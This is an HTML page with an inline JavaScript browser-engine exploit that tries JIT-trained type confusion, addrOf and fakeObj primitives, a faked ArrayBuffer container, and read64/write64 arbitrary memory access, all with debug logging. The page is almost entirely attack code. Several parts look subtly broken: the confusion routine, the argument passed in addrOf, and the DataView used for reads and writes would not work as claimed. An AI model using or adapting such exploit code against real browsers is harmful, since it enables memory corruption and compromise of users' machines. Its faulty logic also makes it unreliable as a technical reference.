<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PsPEE Debugged Exploit</title>
  <style>
    body { background: black; color: lime; font-family: monospace; }
    #log { white-space: pre-wrap; padding: 1em; }
  </style>
</head>
<body>
  <div id="log"></div>
  <script>
    const logDiv = document.getElementById("log");
    const log = msg => { logDiv.textContent += msg + "\n"; };

    // Helpers to convert between f64 <-> u64
    const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
    const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
    const hex = n => "0x" + n.toString(16).padStart(16, "0");

    log("[*] PsPEE v1.4 — JIT-train & leak debug");

    // Type-confusion core
    let float_arr = [1.1,2.2,3.3];
    let obj_arr   = [{},{},{}];
    function confuse(o) {
      let tmp = [1.1,2.2,3.3];
      tmp[1] = o;
      return tmp[1];
    }

    function useConfuse(x) { return confuse(x); }
    function trainConfuse(func) {
      for (let i = 0; i < 20000; i++) {
        try { func(2.2); }
        catch (e) { /* ignore */ }
      }
    }

    // 1) Warm up the JIT
    log("[*] Warming up confuse() in JIT…");
    trainConfuse(useConfuse);

    // 2) Baseline vs. leaked bits
    let baseBits, leakBits;
    try {
      baseBits = f2i(useConfuse(2.2));
      log("[DEBUG] baseline bits for 2.2 → " + hex(baseBits));
    } catch (e) {
      log("[ERROR] baseline f2i failed: " + e);
    }
    try {
      leakBits = f2i(useConfuse({ test: true }));
      log("[DEBUG] leak    bits for {test:true} → " + hex(leakBits));
    } catch (e) {
      log("[ERROR] leak f2i failed: " + e);
    }

    if (baseBits === leakBits) {
      log("[-] No type confusion: bits identical. Adjust training or PoC.");
      throw "Type confusion failed";
    }
    log("[+] Type confusion confirmed (bits differ)!");

    // addrOf / fakeObj primitives
    function addrOf(obj) {
      try {
        obj_arr[0] = obj;
        let r = f2i(confuse(obj_arr));
        log("[DEBUG] addrOf → " + hex(r));
        return r;
      } catch (e) {
        log("[ERROR] addrOf failed: " + e);
        return null;
      }
    }
    function fakeObj(addr) {
      try {
        float_arr[0] = i2f(addr);
        let o = confuse(float_arr);
        log("[DEBUG] fakeObj → " + o);
        return o;
      } catch (e) {
        log("[ERROR] fakeObj failed: " + e);
        return null;
      }
    }

    log("[*] Building memory primitives…");

    // 3) Leak ArrayBuffer address
    let ab = new ArrayBuffer(0x100);
    let ab_addr = addrOf(ab);
    if (!ab_addr) { log("[ERROR] Could not leak ArrayBuffer addr."); throw ""; }
    log("[+] ArrayBuffer @ " + hex(ab_addr));

    // 4) Prepare DataView
    let dv = new DataView(ab);

    // 5) Build fake JSArrayBuffer container fields
    let jsCellHeader, butterfly, vectorLength, backingStore;
    try {
      jsCellHeader = i2f(0x0108200700000000n);
    } catch (e) {
      log("[WARN] jsCellHeader conversion failed: " + e);
      jsCellHeader = i2f(0n);
    }
    butterfly = ab_addr;
    try {
      vectorLength = i2f(0x100n);
    } catch (e) {
      log("[WARN] vectorLength conversion failed: " + e);
      vectorLength = i2f(0n);
    }
    try {
      backingStore = i2f(ab_addr + 0x20n);
    } catch (e) {
      log("[WARN] backingStore conversion failed: " + e);
      backingStore = jsCellHeader;
    }

    log("[DEBUG] container fields:");
    log("  jsCellHeader = " + hex(f2i(jsCellHeader)));
    log("  butterfly    = " + hex(butterfly));
    log("  vectorLength = " + hex(f2i(vectorLength)));
    log("  backingStore = " + hex(f2i(backingStore)));

    let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
    let containerAddr = addrOf(container);
    if (!containerAddr) { log("[ERROR] Could not leak container addr."); throw ""; }
    log("[+] Fake container @ " + hex(containerAddr));

    // 6) Create fake ArrayBuffer
    let fakeAb = fakeObj(containerAddr + 0x20n);
    if (!fakeAb) { log("[ERROR] fakeObj failed, cannot R/W"); throw ""; }
    log("[+] fake ArrayBuffer created");

    // 7) R/W primitives
    function read64(addr) {
      try {
        container.backingStore = i2f(addr);
        let v = f2i(dv.getFloat64(0, true));
        log("[DEBUG] read64(" + hex(addr) + ") → " + hex(v));
        return v;
      } catch (e) {
        log("[ERROR] read64 failed: " + e);
        return null;
      }
    }
    function write64(addr, val) {
      try {
        container.backingStore = i2f(addr);
        dv.setFloat64(0, i2f(val), true);
        log("[DEBUG] write64(" + hex(addr) + "," + hex(val) + ") succeeded");
      } catch (e) {
        log("[ERROR] write64 failed: " + e);
      }
    }

    // 8) Test on a JS object
    let testObj = { magic: 0x1337 };
    let testAddr = addrOf(testObj);
    if (!testAddr) {
      log("[ERROR] Could not leak testObj addr");
    } else {
      log("[+] testObj @ " + hex(testAddr));
      let leaked = read64(testAddr);
      if (leaked !== null) {
        log("[+] read64(testObj) → " + hex(leaked));
        // Optional write:
        write64(testAddr, 0x41424344n);
      }
    }

    log("[*] Done. Check the debug logs above for real R/W evidence.");
  </script>
</body>
</html>
